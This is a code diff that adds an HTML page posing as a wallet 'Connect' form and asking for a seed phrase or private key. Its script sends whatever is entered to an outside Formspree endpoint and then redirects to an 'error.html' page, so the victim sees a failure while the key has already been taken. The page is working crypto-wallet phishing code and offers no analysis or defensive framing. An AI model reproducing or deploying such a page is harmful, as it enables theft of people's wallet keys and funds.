@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="form.css">
+  <title>submit</title>
+</head>
+
+<body>
+  
+  <div class="container">
+    Seed Phrase / Private Key <span class="star">*</span>
+    <form id="myForm">
+      <textarea class="phrase" name="text" id="" cols="30" rows="7"></textarea>
+      <div class="btndiv">
+        <button class="btn">
+          Connect
+        </button>
+      </div>
+    </form>
+  </div>
+  
+  <script>
+    document.getElementById('myForm').addEventListener('submit', function(event) {
+  event.preventDefault(); // Prevent the default form submission
+
+  // Get form data
+  const formData = new FormData(event.target);
+
+  // Prepare the data to send
+  const data = {};
+  formData.forEach((value, key) => {
+    data[key] = value;
+  });
+
+  // Send data to Formspree
+  fetch('https://formspree.io/f/xgvegzwg', { // Replace 'your_form_id' with your actual Formspree form ID
+      method: 'POST',
+      headers: {
+        'Accept': 'application/json',
+      },
+      body: JSON.stringify(data),
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+
+        // Redirect after 2 seconds to another page (e.g., thank-you.html)
+        setTimeout(function() {
+          window.location.href = 'error.html'; // Replace with your desired redirect URL
+        }, 2000); // 2-second delay for a smooth transition
+
+      } else {
+        pass;
+      }
+    })
+    .catch(error => {
+      pass;
+    });
+});
+  </script>
+
+</body>
+
+</html>
